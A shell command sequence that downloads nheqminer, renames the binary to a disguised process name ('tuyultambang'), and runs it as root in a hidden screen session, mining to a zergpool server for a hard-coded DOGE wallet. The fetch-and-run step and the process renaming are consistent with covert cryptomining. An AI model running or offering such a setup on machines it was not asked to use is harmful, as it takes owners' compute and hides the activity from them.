sudo apt install screen -y &&
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz &&
tar -xvf nheqminer-Linux-v0.8.2.tgz &&
tar -xvf nheqminer-Linux-v0.8.2.tar.gz &&
cd nheqminer &&
chmod +x nheqminer &&
mv nheqminer tuyultambang &&
chmod +x tuyultambang &&
screen -dmS run sudo ./tuyultambang -v -l verushash.na.mine.zergpool.com:3300 -u DCTbhxrn5VcNbskyfv2vXD7bHfP6sGMWcp.$(echo $(shuf -i 1-100 -n 1)-DO5) -p c=DOGE -t 40 && screen -r

